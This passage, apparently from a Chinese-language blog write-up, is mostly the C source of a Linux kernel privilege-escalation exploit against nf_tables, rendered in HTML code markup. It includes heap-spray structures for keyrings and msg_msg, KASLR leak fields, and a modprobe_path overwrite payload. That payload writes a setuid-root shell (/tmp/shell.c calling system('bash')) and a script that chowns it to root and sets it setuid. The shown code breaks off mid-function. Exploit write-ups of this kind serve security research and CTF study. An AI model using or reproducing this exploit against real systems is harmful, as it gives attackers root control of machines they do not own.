因为我也不熟悉该模块所以就算自己写也会和他的大差不差 )</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -o exp -l mnl -l nftnl -w</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libmnl/libmnl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/chain.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/expr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/rule.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/table.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/set.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nf_tables.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nfnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ethtool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sockios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/io_uring.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MQUEUE_NUM 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC_MAX 0x800</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAMELEN 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR_PREFIX <span class="meta-string">&quot;err: &quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_DESC_MAX_SIZE 40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREFIX_BUF_LEN 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RCU_HEAD_LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_KEY_SIZE 50</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYSMAP_MASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_SIZE 1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NB_ENTRIES 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> base_base;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_base;</span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_addr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nft_trans_phase</span> &#123;</span></span><br><span class="line">        NFT_TRANS_PREPARE,</span><br><span class="line">        NFT_TRANS_ABORT,</span><br><span class="line">        NFT_TRANS_COMMIT,</span><br><span class="line">        NFT_TRANS_RELEASE</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[BUFFER];</span><br><span class="line">&#125; Msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; <span class="keyword">user_rule_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">keyring_payload</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> prefix[PREFIX_BUF_LEN];</span><br><span class="line">    <span class="keyword">uint8_t</span> rcu_buf[RCU_HEAD_LEN];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">leak</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> kaslr_base;</span><br><span class="line">    <span class="keyword">long</span> physmap_base;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd_uring</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> *<span class="title">params</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span> <span class="keyword">key_serial_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> priv_file[] = <span class="string">&quot;/tmp/shell.c\0&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> dummy_file[] = <span class="string">&quot;/tmp/dummy\0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> priv_context[] = <span class="string">&quot;#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char **argv)&#123;if (geteuid() == 0)&#123;setuid(0);setgid(0);puts(\&quot;[+] I am root\&quot;);system(\&quot;bash\&quot;);&#125;&#125;\x00&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> dummy_content[] = <span class="string">&quot;\xff\xff\xff\xff&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> new_modprobe_content[] = <span class="string">&quot;#!/bin/bash\n\nchown root:root /tmp/shell\nchmod 4555 /tmp/shell\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">key_serial_t</span> <span class="title">add_key</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *type, <span class="keyword">const</span> <span class="keyword">char</span> *description, <span class="keyword">const</span> <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen, <span class="keyword">key_serial_t</span> ringid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, type, description, payload, plen, ringid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">long</span> <span class="title">keyctl</span><span class="params">(<span class="keyword">int</span> operation, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bye</span><span class="params">(<span class="keyword">char</span> *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_error_exit</span><span class="params">(<span class="keyword">char</span> *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bye2</span><span class="params">(<span class="keyword">char</span> *info, <span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   